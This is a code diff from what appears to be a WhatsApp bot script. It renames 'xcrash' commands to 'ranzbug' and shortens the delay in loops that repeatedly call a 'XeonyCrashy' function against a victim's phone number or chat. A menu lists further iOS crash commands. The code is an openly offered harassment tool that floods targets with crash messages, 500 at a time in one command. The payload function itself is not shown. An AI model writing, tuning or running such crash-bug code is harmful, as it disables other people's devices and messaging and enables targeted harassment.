@@ -1879,25 +1879,25 @@ await sleep(3000)
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 }
 break
-case 'xcrash':{
+case 'ranzbug':{
 if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "500"
 for (let i = 0; i < amount; i++) {
 XeonyCrashy(pushname,victim)
-await sleep(3000)
+await sleep(2000)
 }
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 }
 break
-case 'xcrash2':
+case 'ranzbug2':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
  amount = `${encodeURI(text)}`
 for (let i = 0; i < amount; i++) {
 XeonyCrashy(pushname,m.chat)
-await sleep(3000)
+await sleep(2000)
 }
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 break
@@ -2238,8 +2238,8 @@ break
 ╰┈➤ ${xeonytimewisher} 😄
 ${readmore}
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
-xcrash <number>
-xcrash2 <amount>
+ranzbug <number>
+ranzbug2 <amount>
 xioscrash <number>
 xioscrash2 <amount>
 iosgoogle <number>
